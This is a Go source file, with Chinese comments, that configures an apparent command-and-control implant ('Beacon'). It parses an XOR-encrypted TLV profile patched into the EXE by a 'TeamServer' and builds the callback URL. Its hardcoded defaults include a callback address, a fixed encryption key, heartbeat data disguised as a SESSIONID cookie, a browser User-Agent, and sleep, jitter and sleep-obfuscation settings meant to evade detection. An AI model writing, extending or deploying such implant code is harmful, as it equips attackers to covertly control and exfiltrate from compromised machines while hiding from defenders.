// Package profile 实现 Beacon 的配置管理。
// 支持两种加载模式：模板模式（TSCF v2 TLV 配置槽）和调试模式（硬编码默认值）。
// TSCF v2 配置槽位于 EXE 的 .patch 节区，由 TeamServer 的 patch_profile 工具写入。
package profile

import (
	"encoding/binary"
	"errors"
	"fmt"
	"hash/crc32"
	"strings"
	"time"
)

// TSCF v2 配置槽格式常量
const (
	configPatchSlotSize   = 4096                    // 配置槽固定大小（字节）
	configPatchVersion    = 2                       // 当前支持的版本号
	configPatchFlagXOR    = 0x0001                  // 加密标志：XOR
	configPatchKeySize    = 32                      // XOR 密钥长度
	configPatchHeaderSize = 16 + configPatchKeySize // 头部大小：4 magic + 2 ver + 2 flags + 4 len + 4 crc + 32 key
)

// TLV Tag 定义 — 通用配置（1-99）
const (
	cfgListenerName      uint16 = 1 // 监听器名称（string）
	cfgListenerType      uint16 = 2 // 监听器类型（string）
	cfgProtocol          uint16 = 3 // 协议类型（string）
	cfgFormat            uint16 = 4 // 数据格式（string）
	cfgSleepTime         uint16 = 5 // 休眠时间 ms（uint32）
	cfgJitter            uint16 = 6 // 抖动百分比（uint32）
	cfgSleepObfEnabled   uint16 = 7 // 睡眠混淆开关（bool）
	cfgSleepObfTechnique uint16 = 8 // 睡眠混淆技术（uint32/uint8）
)

// TLV Tag 定义 — HTTP 配置（100-199）
const (
	cfgHTTPHost            uint16 = 100 // 目标主机（string）
	cfgHTTPPort            uint16 = 101 // 目标端口（uint32/uint16）
	cfgHTTPURI             uint16 = 102 // 请求路径（string）
	cfgHTTPReconnectCount  uint16 = 103 // 重连次数（uint32）
	cfgHTTPReconnectTime   uint16 = 104 // 重连间隔 ms（uint32）
	cfgHTTPSSL             uint16 = 105 // 是否使用 SSL（bool）
	cfgHTTPMethod          uint16 = 106 // HTTP 方法（string）
	cfgHTTPResponseHeaders uint16 = 107 // 自定义响应头（string）
	cfgHTTPHBHeader        uint16 = 108 // 心跳使用的 Header 名（string）
	cfgHTTPHBPrefix        uint16 = 109 // 心跳 Header 值前缀（string）
	cfgHTTPEncryptKey      uint16 = 110 // 加密密钥 hex（string）
	cfgHTTPHostHeader      uint16 = 111 // Host 头覆盖（string）
	cfgHTTPUserAgent       uint16 = 112 // User-Agent（string）
	cfgHTTPXForwardedFor   uint16 = 113 // X-Forwarded-For 开关（bool）
	cfgHTTPSSLCert         uint16 = 114 // SSL 客户端证书（string）
	cfgHTTPSSLKey          uint16 = 115 // SSL 客户端私钥（string）
	cfgHTTPCallbackHost    uint16 = 116 // 回连地址（string，含 scheme/host/port）
)

// patchSlot 会被 TeamServer 写入 TSCF v2 配置。
var patchSlot = [configPatchSlotSize]byte{
	0x8d, 0x71, 0x2f, 0xa4, 0x19, 0xc0, 0x46, 0x5e,
	0x93, 0x7b, 0x2a, 0xd8, 0x60, 0x1f, 0xb5, 0x0c,
}

// Profile 是 Beacon 的完整运行配置，由 TSCF v2 配置槽或默认值填充。
type Profile struct {
	ListenerName      string        // 监听器名称
	ListenerType      string        // 监听器类型
	Protocol          string        // 协议（http/https/dns/smb 等）
	Format            string        // 数据格式
	HTTP              HTTPProfile   // HTTP 传输配置
	SleepTime         time.Duration // 计算后的休眠时长
	ConnTimeout       time.Duration // HTTP 连接超时
	Jitter            int           // 抖动百分比（0-100）
	SleepObfEnabled   bool          // 是否启用睡眠混淆
	SleepObfTechnique int           // 睡眠混淆技术编号
}

// HTTPProfile 包含 HTTP 传输层的所有配置参数。
type HTTPProfile struct {
	Host            string `json:"host"`             // 目标主机（不含端口）
	Port            int    `json:"port"`             // 目标端口
	SleepTime       int    `json:"sleep_time"`       // 休眠时间（毫秒）
	Jitter          int    `json:"jitter"`           // 抖动百分比
	CallbackHost    string `json:"callback_host"`    // 回连地址（host:port 或完整 URL）
	URI             string `json:"uri"`              // 请求路径
	ReconnectCount  int    `json:"reconnect_count"`  // 失败重连次数
	ReconnectTime   int    `json:"reconnect_time"`   // 重连间隔（毫秒）
	SSL             bool   `json:"ssl"`              // 是否使用 HTTPS
	Method          string `json:"http_method"`      // HTTP 方法（GET/POST）
	ResponseHeaders string `json:"response_headers"` // 自定义响应头
	HBHeader        string `json:"hb_header"`        // 心跳数据承载的 Header 名
	HBPrefix        string `json:"hb_prefix"`        // 心跳 Header 值的前缀
	EncryptKey      string `json:"encrypt_key"`      // AES-256 加密密钥（hex）
	HostHeader      string `json:"host_header"`      // 覆盖 Host 头
	UserAgent       string `json:"user_agent"`       // User-Agent 字符串
	XForwardedFor   bool   `json:"x_forwarded_for"`  // 添加 X-Forwarded-For 头
	SSLCert         string `json:"ssl_cert"`         // 客户端 SSL 证书
	SSLKey          string `json:"ssl_key"`          // 客户端 SSL 私钥
	ContentType     string `json:"content_type"`     // 请求 Content-Type
}

// GlobalProfile 是全局配置实例，在 Load() 时填充。
var GlobalProfile Profile

type patchTarget struct {
	httpHost    string
	callback    string
	port        int
	hasPort     bool
	hasHTTPHost bool
	hasCallback bool
}

// Load 加载 Beacon 配置：检测 TSCF v2 配置槽 → 解析 TLV → 填充 GlobalProfile。
// 若配置槽无 TSCF 魔数，则使用硬编码的默认值（调试模式）。
func Load() error {
	p := defaultProfile()

	if string(patchSlot[0:4]) == "TSCF" {
		fmt.Println("[*] Running in Template Mode (Patched Configuration)")
		parsed, err := parseProfileSlot(patchSlot[:], p)
		if err != nil {
			return fmt.Errorf("failed to parse patch slot: %w", err)
		}
		p = parsed
	} else {
		fmt.Println("[!] Running in Debug Mode (Hardcoded Configuration)")
	}

	finalizeProfile(&p)
	GlobalProfile = p
	return nil
}

func defaultProfile() Profile {
	return Profile{
		HTTP: HTTPProfile{
			SleepTime:      5000,
			Jitter:         20,
			CallbackHost:   "127.0.0.1:9999",
			URI:            "/index.php",
			ReconnectCount: 3,
			ReconnectTime:  3000,
			SSL:            false,
			Method:         "GET",
			HBHeader:       "Cookie",
			HBPrefix:       "SESSIONID=",
			EncryptKey:     "194f7b83023fdd7c6fdfd70a4e6b9cfe",
			UserAgent:      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
			ContentType:    "application/octet-stream",
		},
		ConnTimeout:       10 * time.Second,
		SleepObfEnabled:   false,
		SleepObfTechnique: 2,
	}
}

func finalizeProfile(p *Profile) {
	if p.HTTP.SleepTime <= 0 {
		p.HTTP.SleepTime = 5000
	}
	p.SleepTime = time.Duration(p.HTTP.SleepTime) * time.Millisecond
	p.Jitter = p.HTTP.Jitter
	if p.ConnTimeout <= 0 {
		p.ConnTimeout = 10 * time.Second
	}
	if p.HTTP.Method == "" {
		p.HTTP.Method = "GET"
	}
	if p.HTTP.HBHeader == "" {
		p.HTTP.HBHeader = "Cookie"
	}
	if p.HTTP.ContentType == "" {
		p.HTTP.ContentType = "application/octet-stream"
	}
	if p.HTTP.URI != "" && !strings.HasPrefix(p.HTTP.URI, "/") {
		p.HTTP.URI = "/" + p.HTTP.URI
	}
}

// GetUrl 构建完整的回连 URL（scheme://host:port/uri）。
// 优先使用 CallbackHost，回退到 Host，最终回退到 127.0.0.1。
func (p *Profile) GetUrl() string {
	host := p.HTTP.CallbackHost
	if host == "" {
		host = p.HTTP.Host
	}
	if host == "" {
		host = "127.0.0.1"
	}

	scheme := "http"
	if p.HTTP.SSL {
		scheme = "https"
	}

	if strings.HasPrefix(strings.ToLower(host), "https://") {
		scheme = "https"
		host = host[8:]
	} else if strings.HasPrefix(strings.ToLower(host), "http://") {
		scheme = "http"
		host = host[7:]
	}

	if slash := strings.IndexByte(host, '/'); slash >= 0 {
		host = host[:slash]
	}

	if !strings.Contains(host, ":") {
		port := p.HTTP.Port
		if port == 0 {
			if scheme == "https" {
				port = 443
			} else {
				port = 80
			}
		}
		host = fmt.Sprintf("%s:%d", host, port)
	}

	uri := p.HTTP.URI
	if uri == "" {
		uri = "/"
	}
	if !strings.HasPrefix(uri, "/") {
		uri = "/" + uri
	}
	return fmt.Sprintf("%s://%s%s", scheme, host, uri)
}

// parseProfileSlot 解析 TSCF v2 配置槽。
// 二进制布局：[TSCF magic 4B][version 2B][flags 2B][configLen 4B][crc32 4B][xorKey 32B][encrypted TLV...]
func parseProfileSlot(slot []byte, base Profile) (Profile, error) {
	if len(slot) != configPatchSlotSize {
		return Profile{}, errors.New("invalid config slot size")
	}
	if string(slot[0:4]) != "TSCF" {
		return base, nil
	}

	// 验证版本和加密标志
	version := binary.BigEndian.Uint16(slot[4:6])
	if version != configPatchVersion {
		return Profile{}, fmt.Errorf("unsupported config patch version: %d", version)
	}
	flags := binary.BigEndian.Uint16(slot[6:8])
	if flags != configPatchFlagXOR {
		return Profile{}, fmt.Errorf("unsupported config patch flags: 0x%04x", flags)
	}

	// 验证配置数据长度
	configLen := binary.BigEndian.Uint32(slot[8:12])
	if configLen == 0 || configLen > configPatchSlotSize-configPatchHeaderSize {
		return Profile{}, errors.New("invalid config data length")
	}

	// 提取 CRC32 校验和、XOR 密钥和加密数据
	expectedCRC := binary.BigEndian.Uint32(slot[12:16])
	key := slot[16 : 16+configPatchKeySize]
	encrypted := slot[configPatchHeaderSize : configPatchHeaderSize+int(configLen)]

	// XOR 解密并校验 CRC32
	plain := xorProfileConfig(encrypted, key)
	if crc32.ChecksumIEEE(plain) != expectedCRC {
		return Profile{}, errors.New("config crc mismatch")
	}

	// 解析 TLV 格式的配置项
	if err := parseProfileTLV(&base, plain); err != nil {
		return Profile{}, err
	}
	return base, nil
}

func xorProfileConfig(in []byte, key []byte) []byte {
	out := make([]byte, len(in))
	for i := range in {
		out[i] = in[i] ^ key[i%len(key)]
	}
	return out
}

// parseProfileTLV 解析 TLV 格式的配置数据。
// 每个 TLV 单元：[tag 2B][padding 2B][valueLen 4B][value ...]
func parseProfileTLV(out *Profile, data []byte) error {
	var target patchTarget

	offset := 0
	for offset+8 <= len(data) {
		// 读取 TLV 头部
		tag := binary.BigEndian.Uint16(data[offset : offset+2])
		valueLen := binary.BigEndian.Uint32(data[offset+4 : offset+8])
		offset += 8
		if valueLen > uint32(len(data)-offset) {
			return errors.New("tlv value exceeds config length")
		}

		value := data[offset : offset+int(valueLen)]
		offset += int(valueLen)

		switch tag {
		case cfgListenerName:
			out.ListenerName = parseTLVString(value)
		case cfgListenerType:
			out.ListenerType = parseTLVString(value)
		case cfgProtocol:
			out.Protocol = parseTLVString(value)
		case cfgFormat:
			out.Format = parseTLVString(value)
		case cfgSleepTime:
			if len(value) == 4 {
				out.HTTP.SleepTime = int(binary.BigEndian.Uint32(value))
			}
		case cfgJitter:
			if len(value) == 4 {
				out.HTTP.Jitter = int(binary.BigEndian.Uint32(value))
			}
		case cfgSleepObfEnabled:
			if len(value) > 0 {
				out.SleepObfEnabled = value[0] != 0
			}
		case cfgSleepObfTechnique:
			if len(value) == 4 {
				out.SleepObfTechnique = int(binary.BigEndian.Uint32(value))
			} else if len(value) > 0 {
				out.SleepObfTechnique = int(value[0])
			}
		case cfgHTTPHost:
			target.httpHost = parseTLVString(value)
			target.hasHTTPHost = true
		case cfgHTTPPort:
			if len(value) == 4 {
				target.port = int(binary.BigEndian.Uint32(value))
				target.hasPort = true
			} else if len(value) == 2 {
				target.port = int(binary.BigEndian.Uint16(value))
				target.hasPort = true
			}
		case cfgHTTPCallbackHost:
			target.callback = parseTLVString(value)
			target.hasCallback = true
		case cfgHTTPURI:
			out.HTTP.URI = parseTLVString(value)
			if out.HTTP.URI != "" && !strings.HasPrefix(out.HTTP.URI, "/") {
				out.HTTP.URI = "/" + out.HTTP.URI
			}
		case cfgHTTPReconnectCount:
			if len(value) == 4 {
				out.HTTP.ReconnectCount = int(binary.BigEndian.Uint32(value))
			}
		case cfgHTTPReconnectTime:
			if len(value) == 4 {
				out.HTTP.ReconnectTime = int(binary.BigEndian.Uint32(value))
			}
		case cfgHTTPSSL:
			if len(value) > 0 {
				out.HTTP.SSL = value[0] != 0
			}
		case cfgHTTPMethod:
			out.HTTP.Method = parseTLVString(value)
		case cfgHTTPResponseHeaders:
			out.HTTP.ResponseHeaders = parseTLVString(value)
		case cfgHTTPHBHeader:
			out.HTTP.HBHeader = parseTLVString(value)
		case cfgHTTPHBPrefix:
			out.HTTP.HBPrefix = parseTLVString(value)
		case cfgHTTPEncryptKey:
			out.HTTP.EncryptKey = parseTLVString(value)
		case cfgHTTPHostHeader:
			out.HTTP.HostHeader = parseTLVString(value)
		case cfgHTTPUserAgent:
			out.HTTP.UserAgent = parseTLVString(value)
		case cfgHTTPXForwardedFor:
			if len(value) > 0 {
				out.HTTP.XForwardedFor = value[0] != 0
			}
		case cfgHTTPSSLCert:
			out.HTTP.SSLCert = parseTLVString(value)
		case cfgHTTPSSLKey:
			out.HTTP.SSLKey = parseTLVString(value)
		}
	}

	if offset != len(data) {
		return errors.New("trailing bytes in tlv config")
	}

	applyPatchedTarget(out, target)
	return nil
}

// applyPatchedTarget 将解析出的 host/port/ssl 信息合并到 Profile。
// 优先级：callback_host > http_host > 已有配置值。
func applyPatchedTarget(p *Profile, target patchTarget) {
	if !target.hasCallback && !target.hasHTTPHost && !target.hasPort {
		return
	}

	source := target.httpHost
	if target.hasCallback && target.callback != "" {
		source = target.callback
	}
	if source == "" {
		source = p.HTTP.CallbackHost
	}

	host, sslSet, ssl := normalizeHost(source)
	if sslSet {
		p.HTTP.SSL = ssl
	}
	if target.hasPort && target.port > 0 && !strings.Contains(host, ":") {
		host = fmt.Sprintf("%s:%d", host, target.port)
	}
	if host != "" {
		p.HTTP.CallbackHost = host
		p.HTTP.Host = host
	}
	if target.hasPort {
		p.HTTP.Port = target.port
	}
}

func normalizeHost(src string) (host string, sslSet bool, ssl bool) {
	host = strings.TrimSpace(src)
	lower := strings.ToLower(host)
	if strings.HasPrefix(lower, "https://") {
		host = host[8:]
		sslSet = true
		ssl = true
	} else if strings.HasPrefix(lower, "http://") {
		host = host[7:]
		sslSet = true
		ssl = false
	}
	if slash := strings.IndexByte(host, '/'); slash >= 0 {
		host = host[:slash]
	}
	return host, sslSet, ssl
}

func parseTLVString(b []byte) string {
	return strings.Trim(string(b), "\x00")
}
